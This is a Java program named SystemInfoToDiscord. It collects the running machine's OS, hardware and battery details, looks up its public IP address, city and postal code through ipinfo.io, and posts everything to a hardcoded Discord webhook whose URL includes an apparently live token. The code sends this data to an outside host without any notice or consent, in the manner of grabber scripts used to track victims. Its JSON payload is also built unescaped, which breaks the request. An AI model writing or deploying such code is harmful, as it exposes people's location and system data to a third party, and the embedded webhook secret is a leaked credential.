import java.io.*;
import java.net.*;
import java.util.*;
import java.nio.file.*;
import com.sun.management.OperatingSystemMXBean;
import java.lang.management.*;
import javax.management.*;
import org.json.JSONObject;

public class SystemInfoToDiscord {

    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1303797692471836752/UGvqu5pljOtWO-BwVn722myUjIKAs17lKGPDkPZlCOfuX0fWgqNFgB2zS_OrvnVLJT0T"; // Replace with your webhook URL
    private static final String LOCATION_API_URL = "http://ipinfo.io/json"; // Location API for IP and City info

    public static void main(String[] args) {
        try {
            // Collect system info
            StringBuilder systemInfo = new StringBuilder();

            // OS Information
            systemInfo.append("**Operating System Info**\n");
            systemInfo.append("OS Name: ").append(System.getProperty("os.name")).append("\n");
            systemInfo.append("OS Version: ").append(System.getProperty("os.version")).append("\n");
            systemInfo.append("OS Architecture: ").append(System.getProperty("os.arch")).append("\n");

            // Java Information
            systemInfo.append("\n**Java Info**\n");
            systemInfo.append("Java Version: ").append(System.getProperty("java.version")).append("\n");
            systemInfo.append("Java Vendor: ").append(System.getProperty("java.vendor")).append("\n");

            // CPU Information
            OperatingSystemMXBean osBean = (OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean();
            systemInfo.append("\n**CPU Info**\n");
            systemInfo.append("Available processors: ").append(osBean.getAvailableProcessors()).append("\n");
            systemInfo.append("System load average: ").append(osBean.getSystemLoadAverage()).append("\n");

            // Memory Information
            systemInfo.append("\n**Memory Info**\n");
            systemInfo.append("Total Memory: ").append(Runtime.getRuntime().totalMemory() / (1024 * 1024)).append(" MB\n");
            systemInfo.append("Free Memory: ").append(Runtime.getRuntime().freeMemory() / (1024 * 1024)).append(" MB\n");
            systemInfo.append("Max Memory: ").append(Runtime.getRuntime().maxMemory() / (1024 * 1024)).append(" MB\n");

            // Battery Information (for laptops)
            systemInfo.append("\n**Battery Info**\n");
            if (System.getProperty("os.name").toLowerCase().contains("windows") || System.getProperty("os.name").toLowerCase().contains("linux")) {
                try {
                    String batteryStatus = getBatteryStatus();
                    systemInfo.append(batteryStatus);
                } catch (IOException e) {
                    systemInfo.append("Unable to fetch battery info.\n");
                }
            } else {
                systemInfo.append("Battery info is not available on this platform.\n");
            }

            // Network Info (City, IP, Postal Code)
            systemInfo.append("\n**Location and IP Info**\n");
            try {
                String locationInfo = getLocationInfo();
                systemInfo.append(locationInfo);
            } catch (IOException e) {
                systemInfo.append("Unable to fetch location info.\n");
            }

            // Sending the info to Discord webhook
            sendToDiscord(systemInfo.toString());

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Function to get battery status
    private static String getBatteryStatus() throws IOException {
        StringBuilder batteryStatus = new StringBuilder();

        // Windows Battery Info (Using WMIC command)
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            String command = "wmic battery get status,estimatedchargeremaining";
            Process process = Runtime.getRuntime().exec(command);
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    batteryStatus.append(line).append("\n");
                }
            }
        }
        // Linux Battery Info (Using cat to fetch battery data)
        else if (System.getProperty("os.name").toLowerCase().contains("linux")) {
            try {
                File batteryFile = new File("/sys/class/power_supply/BAT0/capacity");
                if (batteryFile.exists()) {
                    List<String> lines = Files.readAllLines(batteryFile.toPath());
                    batteryStatus.append("Battery Percentage: ").append(lines.get(0)).append("%\n");
                    File statusFile = new File("/sys/class/power_supply/BAT0/status");
                    lines = Files.readAllLines(statusFile.toPath());
                    batteryStatus.append("Charging Status: ").append(lines.get(0)).append("\n");
                }
            } catch (IOException e) {
                batteryStatus.append("Unable to fetch battery status on Linux.\n");
            }
        }

        return batteryStatus.toString();
    }

    // Function to get location info (City, IP, Postal Code)
    private static String getLocationInfo() throws IOException {
        StringBuilder locationInfo = new StringBuilder();

        // Make a request to ipinfo.io to get IP, city, and postal code
        URL url = new URL(LOCATION_API_URL);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.setDoOutput(true);

        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            response.append(line);
        }

        // Parse the JSON response from ipinfo.io
        JSONObject jsonResponse = new JSONObject(response.toString());
        String ip = jsonResponse.getString("ip");
        String city = jsonResponse.getString("city");
        String postalCode = jsonResponse.getString("postal");

        locationInfo.append("IP Address: ").append(ip).append("\n");
        locationInfo.append("City: ").append(city).append("\n");
        locationInfo.append("Postal Code: ").append(postalCode).append("\n");

        return locationInfo.toString();
    }

    // Function to send collected data to Discord webhook
    private static void sendToDiscord(String content) {
        try {
            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/json");

            String jsonPayload = "{\"content\":\"" + content.replace("\n", "\n") + "\"}";

            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = jsonPayload.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            try (BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream(), "utf-8"))) {
                StringBuilder response = new StringBuilder();
                String responseLine;
                while ((responseLine = br.readLine()) != null) {
                    response.append(responseLine.trim());
                }
                System.out.println("Response from Discord: " + response.toString());
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
